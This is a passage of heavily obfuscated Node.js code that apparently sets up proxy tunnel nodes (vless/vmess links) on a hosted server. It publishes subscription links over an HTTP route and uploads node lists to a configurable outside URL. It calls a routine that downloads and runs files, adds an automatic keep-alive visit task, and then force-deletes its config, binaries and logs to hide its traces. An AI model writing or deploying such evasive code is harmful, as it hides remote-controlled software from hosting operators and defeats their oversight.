_0x1fec82={_0x2339f4:0x16b,_0x5c3c73:0x1dd,_0x1dbc68:0x159,_0x73a752:0x12c,_0x1df546:0x154,_0x54236e:0x185,_0xa18f20:0x14b,_0x564f29:0x180,_0x5e175d:0x12c,_0x50336f:0x13a,_0x430c4a:0x1a9,_0x26496b:0x1bb,_0x5e2a49:0x1a9,_0x2a8aac:0x1ab,_0x22e36a:0x1a4};setTimeout(()=>{const _0x25d077={_0x47562b:0x1b6,_0x1646c2:0x1bb,_0x5cab64:0x1d4,_0x166014:0x175},_0x52f83d=_0x45f4,_0xa08208={'v':'2','ps':''+_0x21f9c0,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x52f83d(_0x1fec82._0x2339f4),'net':'ws','type':_0x52f83d(0x16b),'host':_0x473379,'path':_0x52f83d(_0x1fec82._0x5c3c73),'tls':'tls','sni':_0x473379,'alpn':'','fp':_0x52f83d(0x137)},_0x4397cb=_0x52f83d(_0x1fec82._0x1dbc68)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x473379+_0x52f83d(_0x1fec82._0x73a752)+_0x473379+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x21f9c0+_0x52f83d(_0x1fec82._0x1df546)+Buffer[_0x52f83d(_0x1fec82._0x54236e)](JSON[_0x52f83d(_0x1fec82._0xa18f20)](_0xa08208))[_0x52f83d(0x1b6)]('base64')+_0x52f83d(_0x1fec82._0x564f29)+UUID+'@'+CFIP+':'+CFPORT+_0x52f83d(0x12f)+_0x473379+_0x52f83d(_0x1fec82._0x5e175d)+_0x473379+_0x52f83d(0x1c0)+_0x21f9c0+_0x52f83d(_0x1fec82._0x50336f);console[_0x52f83d(_0x1fec82._0x430c4a)](Buffer[_0x52f83d(0x185)](_0x4397cb)['toString'](_0x52f83d(_0x1fec82._0x26496b))),fs['writeFileSync'](subPath,Buffer[_0x52f83d(_0x1fec82._0x54236e)](_0x4397cb)['toString'](_0x52f83d(0x1bb))),console[_0x52f83d(_0x1fec82._0x5e2a49)](FILE_PATH+_0x52f83d(_0x1fec82._0x2a8aac)),uploadNodes(),app[_0x52f83d(_0x1fec82._0x22e36a)]('/'+SUB_PATH,(_0x7f30a6,_0x293f20)=>{const _0x5b24b4=_0x52f83d,_0x4633a0=Buffer['from'](_0x4397cb)[_0x5b24b4(_0x25d077._0x47562b)](_0x5b24b4(_0x25d077._0x1646c2));_0x293f20['set'](_0x5b24b4(_0x25d077._0x5cab64),_0x5b24b4(_0x25d077._0x166014)),_0x293f20[_0x5b24b4(0x169)](_0x4633a0);}),_0x56b42d(_0x4397cb);},0x7d0);});}}async function uploadNodes(){const _0x108869={_0x1a3c9b:0x1aa,_0x589511:0x13d,_0x4ae51b:0x190,_0x3ba3a3:0x1a9,_0x156449:0x17b,_0x382bf4:0x190,_0x2ab6d5:0x1e5,_0x3b02d2:0x12b,_0x393eef:0x1aa,_0x25179a:0x1ba},_0x4b13af=_0x3cdc91;if(UPLOAD_URL&&PROJECT_URL){const _0xa75077=PROJECT_URL+'/'+SUB_PATH,_0x10f305={'subscription':[_0xa75077]};try{const _0xac3c14=await axios[_0x4b13af(_0x108869._0x1a3c9b)](UPLOAD_URL+_0x4b13af(_0x108869._0x589511),_0x10f305,{'headers':{'Content-Type':'application/json'}});return _0xac3c14&&_0xac3c14[_0x4b13af(_0x108869._0x4ae51b)]===0xc8?(console[_0x4b13af(_0x108869._0x3ba3a3)](_0x4b13af(0x1c6)),_0xac3c14):null;}catch(_0xdf8df){if(_0xdf8df[_0x4b13af(0x17b)]){if(_0xdf8df[_0x4b13af(_0x108869._0x156449)][_0x4b13af(_0x108869._0x382bf4)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x3be2de=fs[_0x4b13af(_0x108869._0x2ab6d5)](listPath,_0x4b13af(0x133)),_0x3ecb46=_0x3be2de[_0x4b13af(0x152)]('\x0a')[_0x4b13af(_0x108869._0x3b02d2)](_0x2f83a0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4b13af(0x167)](_0x2f83a0));if(_0x3ecb46['length']===0x0)return;const _0x47120c=JSON['stringify']({'nodes':_0x3ecb46});try{const _0x1ed1b1=await axios[_0x4b13af(_0x108869._0x393eef)](UPLOAD_URL+_0x4b13af(_0x108869._0x25179a),_0x47120c,{'headers':{'Content-Type':_0x4b13af(0x1da)}});return _0x1ed1b1&&_0x1ed1b1[_0x4b13af(_0x108869._0x382bf4)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x1ed1b1):null;}catch(_0x31d029){return null;}}else return;}}function cleanFiles(){const _0x5eed17={_0x332aca:0x1af,_0x262f42:0x1af,_0x4cf189:0x1e1,_0x4154c8:0x1a7,_0x562c83:0x1d5,_0x3d8953:0x191,_0x1a5873:0x16a},_0x3b1c0f={_0x43fe6b:0x165,_0xb0af0c:0x1a9,_0x5dfc23:0x1a9},_0x12f754={_0x5f2360:0x184};setTimeout(()=>{const _0x5ccc34=_0x45f4,_0x1a7a77=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1a7a77[_0x5ccc34(_0x5eed17._0x332aca)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1a7a77[_0x5ccc34(_0x5eed17._0x262f42)](phpPath);process[_0x5ccc34(_0x5eed17._0x4cf189)]===_0x5ccc34(_0x5eed17._0x4154c8)?exec('del\x20/f\x20/q\x20'+_0x1a7a77[_0x5ccc34(0x191)]('\x20')+_0x5ccc34(_0x5eed17._0x562c83),_0x11e4fd=>{const _0x5a4e92=_0x5ccc34;console[_0x5a4e92(0x165)](),console[_0x5a4e92(0x1a9)](_0x5a4e92(0x143)),console[_0x5a4e92(0x1a9)](_0x5a4e92(_0x12f754._0x5f2360));}):exec(_0x5ccc34(0x15a)+_0x1a7a77[_0x5ccc34(_0x5eed17._0x3d8953)]('\x20')+_0x5ccc34(_0x5eed17._0x1a5873),_0x5831b3=>{const _0x2e442b=_0x5ccc34;console[_0x2e442b(_0x3b1c0f._0x43fe6b)](),console[_0x2e442b(_0x3b1c0f._0xb0af0c)]('App\x20is\x20running'),console[_0x2e442b(_0x3b1c0f._0x5dfc23)](_0x2e442b(0x184));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2fe851={_0x4039ce:0x1da},_0x1a9352=_0x3cdc91;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1a9352(0x1a9)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x460621=await axios[_0x1a9352(0x1aa)](_0x1a9352(0x18c),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1a9352(_0x2fe851._0x4039ce)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x460621;}catch(_0x384d44){return console[_0x1a9352(0x1be)](_0x1a9352(0x1bf)+_0x384d44['message']),null;}}function _0x45f4(_0x57c413,_0x466bb9){const _0x28bef2=_0x28be();return _0x45f4=function(_0x45f466,_0x377160){_0x45f466=_0x45f466-0x12a;let _0x55a54f=_0x28bef2[_0x45f466];return _0x55a54f;},_0x45f4(_0x57c413,_0x466bb9);}async function startserver(){const _0x6450d6=_0x3cdc91;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x28122d){console['error'](_0x6450d6(0x198),_0x28122d);}}startserver()['catch'](_0x41295=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x41295);}),app[_0x3cdc91(0x15f)](PORT,()=>console[_0x3cdc91(0x1a9)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
